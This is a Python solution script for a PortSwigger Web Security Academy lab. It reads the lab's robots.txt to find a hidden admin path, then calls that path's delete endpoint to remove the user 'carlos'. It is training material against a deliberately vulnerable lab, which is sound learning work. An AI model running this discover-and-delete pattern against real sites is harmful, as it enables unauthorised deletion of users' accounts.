'''This lab has an unprotected admin panel.

Solve the lab by deleting the user carlos

Lab link: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality
'''

import requests
import re

lab_id = '0ab000cf04a64ad480be266b00410012' # change according to generated lab_id

# The admin endpoint is hidden in the front page's robots.txt file
uri = f"https://{lab_id}.web-security-academy.net/robots.txt"
r = requests.get(uri)
matches = re.search(r'\w*:\s*(\/.*)', r.text)
print(r.text)



# We go directly to the endpoint and delete carlos
admin_endpoint = matches[1]
uri = f"https://{lab_id}.web-security-academy.net{admin_endpoint}/delete?username=carlos"
r2 = requests.get(uri)

print('finished')